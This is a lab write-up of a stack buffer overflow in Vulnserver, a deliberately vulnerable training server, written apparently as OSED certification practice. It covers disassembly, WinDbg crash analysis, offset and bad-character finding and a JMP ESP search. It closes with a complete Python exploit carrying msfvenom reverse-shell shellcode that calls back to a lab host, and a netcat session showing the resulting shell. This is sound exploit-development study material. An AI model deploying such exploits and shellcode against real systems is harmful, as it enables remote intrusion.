# Vulnserver - Basic Buffer Overflow

As a part of my preparation to take OSED Certification from Offsec I decided to find some publicly available challenges which were based on reverse engineering/exploitation and test my newly gained skillz. Let's start with https://github.com/stephenbradshaw/vulnserver.

## Initial analysis

The binary itself is a portable 32bit console app.
Running the binary gives following output:

```
Starting vulnserver version 1.00
Called essential function dll version 1.00

This is vulnerable software!
Do not allow access from untrusted systems or networks!

Waiting for client connections...
```

Now the programs hangs as it is waiting for incoming connection - based on the text. Let's verify it in IDA and WinDBG.

Opening the executable in IDA Pro show that opening of the port and accespting of the connection is done in the main function. Than a new thread is created to handle the connection. It is implemented in `ConnectionHandler` function

```
mov     [esp+298h+Format], offset aReceivedAClien ; "Received a client connection from %s:%u"...
call    _printf
mov     [esp+298h+lpThreadId], 0 ; lpThreadId
mov     [esp+298h+dwCreationFlags], 0 ; dwCreationFlags
mov     eax, [ebp+lpParameter]
mov     [esp+298h+ppResult], eax ; lpParameter
mov     [esp+298h+Size], offset _ConnectionHandler@4 ; lpStartAddress
mov     [esp+298h+Src], 0 ; dwStackSize
mov     [esp+298h+Format], 0 ; lpThreadAttributes
call    _CreateThread@24 ; CreateThread(x,x,x,x,x,x)
```

The vulnerable server listens on `TCP	0.0.0.0:9999	0.0.0.0:0	LISTENING`, so let's try to connect and let's see what is happening.

After connecting it sends us back following message "b'Welcome to Vulnerable Server! Enter HELP for help.\n'". So let's try sending the HELP command.

After that message we will get following list of command:
```
b'Valid Commands:\nHELP\nSTATS [stat_value]\nRTIME [rtime_value]\nLTIME [ltime_value]\nSRUN [srun_value]\nTRUN [trun_value]\nGMON [gmon_value]\nGDOG [gdog_value]\nKSTET [kstet_value]\nGTER [gter_value]\nHTER [hter_value]\nLTER [lter_value]\nKSTAN [lstan_value]\nEXIT\n'
```

Checking the `ConnectionHandler` function we can see the checks for the same command list. All the commands are have potential for a vulnerability, so we should go one by one and check the following logic. As we want to have a buffer overflow we should check for calling of functions which might cause such state.

Let's start with for example `TRUN` command. The important part of the function is this, which compare the recieved string with "TRUN " string.

```
loc_401CDB:             ; MaxCount
mov     [esp+5A8h+MaxCount], 5
mov     [esp+5A8h+Val], offset aTrun ; "TRUN "
mov     eax, [ebp+buf]
mov     [esp+5A8h+Size], eax ; Str1
call    _strncmp
test    eax, eax
jnz     loc_401DDA
```

First the command use malloc to allocate memory ith static size of BB8h (3000). Afterwards it check that there is a `2Eh` character in after the command string and if so it will copy the whole message with a fix size of `0BB8h` with `strncpy`. Afterwards the calls `_Function3`.

This function starts to be interesting as it use `strcpy` without defined size (which could lead into Buffer Overflow). Unfortunately in our case the size was checked with the previous `strncpy` call. But checking the code of the function:

```
.text:00401808 push    ebp
.text:00401809 mov     ebp, esp
.text:0040180B sub     esp, 7E8h
.text:00401811 mov     eax, [ebp+arg_0]
.text:00401814 mov     [esp+7E8h+Source], eax ; Source
.text:00401818 lea     eax, [ebp+var_7D8]
.text:0040181E mov     [esp+7E8h+Destination], eax ; Destination
.text:00401821 call    _strcpy
.text:00401826 leave
.text:00401827 retn
```

We can see that the destination buffer is on stack and that we are reserving just `7D8x` space there for the copy. Let check the info before calling the `strcpy`.

```
0:003> dd esp L3
00cdf1d8  00cdf1e8 001f49d8 00000000
```

This allows us to rewrite the value on ESP when we return from this function as we safe more data than we have space for. It results in overwritten EIP.

```
0:003> g
(2c9c.205c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00e2f1e8 ebx=000000cc ecx=001a559c edx=00000000 esi=00401848 edi=00401848
eip=41414141 esp=00e2f9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
```

Good we have the overflow, let's work the whole exploit now.

## Exploit

Let's start with the exploit we were able to start to trigger the overflow with EIP rewrite.

```
#!/usr/bin/python
import socket, sys
from struct import pack
import time

def main():
	server = "192.168.130.169"
	port = 9999

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	print(s.recv(1024))

	buf = b"TRUN ."			#control string
	buf += b"A"*0xBB8

	s.send(buf)

	print(s.recv(1024))

	s.close()
	sys.exit(0)

if __name__ == "__main__":
 	main()
```

### Offset

Let's use the pattern creator to find out the offset.

```
(994.2a34): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00a6f1e8 ebx=000000cc ecx=00e0559c edx=00000000 esi=00401848 edi=00401848
eip=396f4338 esp=00a6f9c8 ebp=6f43376f iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
396f4338 ??              ???
```

```
└─$ msf-pattern_offset -l 0xbb8 -q 396f4338
[*] Exact match at offset 2006
```

And let's confirm with sending Bs to overwrite the EIP.

```
buf = b"TRUN ."
buf += b"A"*2006
buf += b"B"*4
buf += b"C"*(0xBB8 -len(buf))
```

```
(2c50.8d0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00cdf1e8 ebx=000000cc ecx=001e559c edx=00000000 esi=00401848 edi=00401848
eip=42424242 esp=00cdf9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
42424242 ??              ???
```

Good we have a control of EIP.

### Bad Chars

Next step is to send all characters and observed for bad one. We will omit `\x00` from the start is that breaks the `strcpy`.

```
0:003> db esp L 100
00eff9c8  01 02 03 04 05 06 07 08-09 0a 0b 0c 0d 0e 0f 10  ................
00eff9d8  11 12 13 14 15 16 17 18-19 1a 1b 1c 1d 1e 1f 20  ...............
00eff9e8  21 22 23 24 25 26 27 28-29 2a 2b 2c 2d 2e 2f 30  !"#$%&'()*+,-./0
00eff9f8  31 32 33 34 35 36 37 38-39 3a 3b 3c 3d 3e 3f 40  123456789:;<=>?@
00effa08  41 42 43 44 45 46 47 48-49 4a 4b 4c 4d 4e 4f 50  ABCDEFGHIJKLMNOP
00effa18  51 52 53 54 55 56 57 58-59 5a 5b 5c 5d 5e 5f 60  QRSTUVWXYZ[\]^_`
00effa28  61 62 63 64 65 66 67 68-69 6a 6b 6c 6d 6e 6f 70  abcdefghijklmnop
00effa38  71 72 73 74 75 76 77 78-79 7a 7b 7c 7d 7e 7f 80  qrstuvwxyz{|}~..
00effa48  81 82 83 84 85 86 87 88-89 8a 8b 8c 8d 8e 8f 90  ................
00effa58  91 92 93 94 95 96 97 98-99 9a 9b 9c 9d 9e 9f a0  ................
00effa68  a1 a2 a3 a4 a5 a6 a7 a8-a9 aa ab ac ad ae af b0  ................
00effa78  b1 b2 b3 b4 b5 b6 b7 b8-b9 ba bb bc bd be bf c0  ................
00effa88  c1 c2 c3 c4 c5 c6 c7 c8-c9 ca cb cc cd ce cf d0  ................
00effa98  d1 d2 d3 d4 d5 d6 d7 d8-d9 da db dc dd de df e0  ................
00effaa8  e1 e2 e3 e4 e5 e6 e7 e8-e9 ea eb ec ed ee ef f0  ................
00effab8  f1 f2 f3 f4 f5 f6 f7 f8-f9 fa fb fc fd fe ff 43  ...............C
```

It seems all is good and we can use what ever we need except null byte.

### Redirection of the follow

We are getting to the end. Now we need to redirect flow to a memory which is executable and we can reliably jump there. Checking the registry at the time of the crash we can see that `ESP` is pointing just after the overwritten `EIP`. Let's search for `jmp esp` or anything similar.

The executable itself have a null butes at the beginning of the address, so it is not a good candidate, but essfunc is also part of the app and it seems the address is null byte free.

```
0:003> lm
start    end        module name
00400000 00407000   vulnserver   (deferred)             
62500000 62508000   essfunc    (deferred)             
74dc0000 74e16000   mswsock    (deferred)             
75a70000 75c87000   KERNELBASE   (deferred)             
761d0000 7626a000   KERNEL32   (deferred)             
76300000 763c5000   RPCRT4     (deferred)             
76d50000 76e0f000   msvcrt     (deferred)             
76f90000 76ff3000   WS2_32     (deferred)             
775f0000 7778f000   ntdll      (pdb symbols)       

0:003> lmDvmessfunc
Browse full module list
start    end        module name
62500000 62508000   essfunc    (deferred)             
    Image path: C:\Users\labuser\Downloads\vulnserver-master\essfunc.dll
    Image name: essfunc.dll
    Browse all global symbols  functions  data
    Timestamp:        Fri Nov 19 07:41:04 2010 (4CE61C00)
    CheckSum:         0000E774
    ImageSize:        00008000
    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4
    Information from resource tables:
		```

`jmp esp` have following opcode `0xff 0xe4`, so we can use search functionality in WinDbg to find such opcodes in the chosen module.

```
0:003> s -b 62500000 62508000   0xff 0xe4
625011af  ff e4 ff e0 58 58 c3 5d-c3 55 89 e5 ff e4 ff e1  ....XX.].U......
625011bb  ff e4 ff e1 5b 5b c3 5d-c3 55 89 e5 ff e4 ff e3  ....[[.].U......
625011c7  ff e4 ff e3 5d 5d c3 5d-c3 55 89 e5 ff e4 ff e7  ....]].].U......
625011d3  ff e4 ff e7 5b 5b c3 5d-c3 55 89 e5 ff e4 ff e2  ....[[.].U......
625011df  ff e4 ff e2 59 5a c3 5d-c3 55 89 e5 ff e4 ff e6  ....YZ.].U......
625011eb  ff e4 ff e6 59 58 c3 5d-c3 55 89 e5 ff e4 ff e5  ....YX.].U......
625011f7  ff e4 ff e5 58 5a c3 5d-c3 55 89 e5 ff e4 ff e4  ....XZ.].U......
62501203  ff e4 ff e4 ff 64 24 f4-59 59 c3 5d c3 55 89 e5  .....d$.YY.].U..
62501205  ff e4 ff 64 24 f4 59 59-c3 5d c3 55 89 e5 81 ec  ...d$.YY.].U....
0:003> u 625011af  
essfunc!EssentialFunc2+0x3:
625011af ffe4            jmp     esp
```

One good candidate is address `0x625011af`. Let's put that in our exploit.

```
0:000> bp 0x625011af
0:000> g
ModLoad: 74dc0000 74e16000   C:\Windows\system32\mswsock.dll
Breakpoint 0 hit
eax=00eef1e8 ebx=000000cc ecx=001e559c edx=00000000 esi=00401848 edi=00401848
eip=625011af esp=00eef9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
essfunc!EssentialFunc2+0x3:
625011af ffe4            jmp     esp {00eef9c8}
0:003> p
eax=00eef1e8 ebx=000000cc ecx=001e559c edx=00000000 esi=00401848 edi=00401848
eip=00eef9c8 esp=00eef9c8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
00eef9c8 43              inc     ebx
```

 We were able to redirect the flow and land in a memory that is under our control. The last step is to use shellcode to get a reverse shell.

### Getting Access

We will use msfvenom to generate the reverse shell payload with following properties `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.130.1 LPORT=4444 -f python -v shellcode -b '\x00' EXITFUNC=thread`. As this is a threaded application, it seems that without EXITFUNC=thread it doesn't reliably work. Also it is needed to add nop-slide, otherwise the shellcode doesn't run.As we have enough space on the stack, we can just chain it together.

```
buf += eip
buf += b"\x90" * 30
buf += shellcode
buf += b"C"*(0xBB8 -len(buf))
```

And vioala we have the a working exploit.

```
labman@lab ~ % netcat -l -p 4444

Microsoft Windows [Version 10.0.19045.2006]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
C:\Program Files\Windows Kits\10\Debuggers>
C:\Program Files\Windows Kits\10\Debuggers>^C%
```

### The whole exploit script

```
 #!/usr/bin/python
 import socket, sys
 from struct import pack
 import time

 def main():
 	server = "192.168.130.169"
 	port = 9999

 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((server, port))

 	print(s.recv(1024))

 	# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.130.1 LPORT=4444 -f python -v shellcode -b '\x00' EXITFUNC=thread
 	shellcode =  b""
 	shellcode += b"\xdb\xd9\xba\xe2\x7a\x35\xd9\xd9\x74\x24\xf4"
 	shellcode += b"\x5b\x2b\xc9\xb1\x52\x31\x53\x17\x03\x53\x17"
 	shellcode += b"\x83\x21\x7e\xd7\x2c\x59\x97\x95\xcf\xa1\x68"
 	shellcode += b"\xfa\x46\x44\x59\x3a\x3c\x0d\xca\x8a\x36\x43"
 	shellcode += b"\xe7\x61\x1a\x77\x7c\x07\xb3\x78\x35\xa2\xe5"
 	shellcode += b"\xb7\xc6\x9f\xd6\xd6\x44\xe2\x0a\x38\x74\x2d"
 	shellcode += b"\x5f\x39\xb1\x50\x92\x6b\x6a\x1e\x01\x9b\x1f"
 	shellcode += b"\x6a\x9a\x10\x53\x7a\x9a\xc5\x24\x7d\x8b\x58"
 	shellcode += b"\x3e\x24\x0b\x5b\x93\x5c\x02\x43\xf0\x59\xdc"
 	shellcode += b"\xf8\xc2\x16\xdf\x28\x1b\xd6\x4c\x15\x93\x25"
 	shellcode += b"\x8c\x52\x14\xd6\xfb\xaa\x66\x6b\xfc\x69\x14"
 	shellcode += b"\xb7\x89\x69\xbe\x3c\x29\x55\x3e\x90\xac\x1e"
 	shellcode += b"\x4c\x5d\xba\x78\x51\x60\x6f\xf3\x6d\xe9\x8e"
 	shellcode += b"\xd3\xe7\xa9\xb4\xf7\xac\x6a\xd4\xae\x08\xdc"
 	shellcode += b"\xe9\xb0\xf2\x81\x4f\xbb\x1f\xd5\xfd\xe6\x77"
 	shellcode += b"\x1a\xcc\x18\x88\x34\x47\x6b\xba\x9b\xf3\xe3"
 	shellcode += b"\xf6\x54\xda\xf4\xf9\x4e\x9a\x6a\x04\x71\xdb"
 	shellcode += b"\xa3\xc3\x25\x8b\xdb\xe2\x45\x40\x1b\x0a\x90"
 	shellcode += b"\xc7\x4b\xa4\x4b\xa8\x3b\x04\x3c\x40\x51\x8b"
 	shellcode += b"\x63\x70\x5a\x41\x0c\x1b\xa1\x02\xf3\x74\x2b"
 	shellcode += b"\xd3\x9b\x86\x2b\xc5\x07\x0e\xcd\x8f\xa7\x46"
 	shellcode += b"\x46\x38\x51\xc3\x1c\xd9\x9e\xd9\x59\xd9\x15"
 	shellcode += b"\xee\x9e\x94\xdd\x9b\x8c\x41\x2e\xd6\xee\xc4"
 	shellcode += b"\x31\xcc\x86\x8b\xa0\x8b\x56\xc5\xd8\x03\x01"
 	shellcode += b"\x82\x2f\x5a\xc7\x3e\x09\xf4\xf5\xc2\xcf\x3f"
 	shellcode += b"\xbd\x18\x2c\xc1\x3c\xec\x08\xe5\x2e\x28\x90"
 	shellcode += b"\xa1\x1a\xe4\xc7\x7f\xf4\x42\xbe\x31\xae\x1c"
 	shellcode += b"\x6d\x98\x26\xd8\x5d\x1b\x30\xe5\x8b\xed\xdc"
 	shellcode += b"\x54\x62\xa8\xe3\x59\xe2\x3c\x9c\x87\x92\xc3"
 	shellcode += b"\x77\x0c\xb2\x21\x5d\x79\x5b\xfc\x34\xc0\x06"
 	shellcode += b"\xff\xe3\x07\x3f\x7c\x01\xf8\xc4\x9c\x60\xfd"
 	shellcode += b"\x81\x1a\x99\x8f\x9a\xce\x9d\x3c\x9a\xda"

 	eip = pack("<L", (0x625011af))

 	buf = b"TRUN ."
 	buf += b"A"*2006
 	buf += eip
 	buf += b"\x90" * 30
 	buf += shellcode
 	buf += b"C"*(0xBB8 -len(buf))

 	s.send(buf)

 	print(s.recv(1024))

 	s.close()
 	sys.exit(0)

 if __name__ == "__main__":
  	main()
```
